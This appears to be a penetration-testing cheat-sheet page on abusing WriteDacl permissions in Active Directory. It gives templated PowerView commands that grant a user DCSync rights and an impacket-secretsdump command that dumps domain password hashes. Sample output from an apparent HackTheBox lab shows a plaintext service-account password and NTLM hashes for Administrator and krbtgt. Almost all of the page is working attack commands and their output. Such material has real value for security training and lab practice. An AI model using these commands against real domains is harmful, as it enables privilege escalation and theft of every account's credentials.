---
title: "WriteDacl"
date: 2024-7-12
tags: ["Writedacl", "Dcsync", "Powerview", "Credential Dumping", "Active Directory", "Windows"]
---

### Abuse #1: Add dcsync right to user

{{< tab set1 tab1 active >}}Windows{{< /tab >}}
{{< tabcontent set1 tab1 >}}

#### 1. Import PowerView

```console
. .\PowerView.ps1
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> . .\PowerView.ps1
```

#### 2. Create a cred object (runas) \[optional\]

```console
$username = '<DOMAIN>\<USER>'
```

```console
$password = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
```

```console
$cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password
```

#### 3. Add dcsync right

```console
Add-DomainObjectAcl -PrincipalIdentity <USER> -TargetIdentity '<DOMAIN>\<TARGET_GROUP>' -Rights DCSync -Credential $cred
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Add-DomainObjectAcl -PrincipalIdentity 'svc-alfresco' -TargetIdentity 'HTB.LOCAL\Domain Admins' -Rights DCSync -Credential $Cred
```

{{< /tabcontent >}}

### 4. Secrets dump

{{< tab set2 tab1 active >}}Linux{{< /tab >}}
{{< tabcontent set2 tab1 >}}

```console
impacket-secretsdump '<USER>:<PASSWORD>@<TARGET>'
```

```console {class="sample-code"}
$ impacket-secretsdump 'svc-alfresco:s3rvice@10.10.10.161'
Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
...[SNIP]...
[*] Cleaning up...
```

{{< /tabcontent >}}
